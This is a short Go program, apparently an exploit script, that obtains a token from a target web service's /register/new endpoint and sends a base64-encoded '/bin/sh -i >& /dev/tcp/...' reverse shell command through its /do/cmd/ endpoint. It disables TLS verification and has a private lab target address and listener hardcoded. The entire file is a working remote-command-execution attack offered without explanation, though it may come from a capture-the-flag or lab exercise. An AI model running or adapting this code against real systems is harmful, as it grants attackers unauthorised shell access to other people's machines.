package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
)

var uuid string = "2b56fd73-d8e5-47a4-9fb5-bb9f99913060"

func getToken(u string) string {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	data := map[string]string{"uuid": uuid}
	json_data, _ := json.Marshal(data)
	resp, err := http.Post(u+"/register/new", "application/json", bytes.NewBuffer(json_data))
	if err != nil {
		fmt.Print(err)

	}

	a, _ := ioutil.ReadAll(resp.Body)
	var f interface{}
	err = json.Unmarshal(a, &f)
	if err != nil {
		fmt.Print(err)
	}

	return f.(map[string]interface{})["token"].(string)
}

func getShell(tk, u, ip, port string) {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	shell := "/bin/sh -i >& /dev/tcp/" + ip + "/" + port + " 0>&1"
	cmd := u + "/do/cmd/" + base64.StdEncoding.EncodeToString([]byte(shell))
	fmt.Print(cmd)
	req, _ := http.NewRequest("GET", cmd, nil)
	req.Header.Set("X-UUID", uuid)
	req.Header.Set("X-Token", tk)
	client := http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Print(err)
	}
	b, _ := ioutil.ReadAll(resp.Body)
	fmt.Print(string(b))

}
func main() {
	getShell(getToken("https://10.0.1.21"), "https://10.0.1.21", "10.0.1.4", "8081")
}
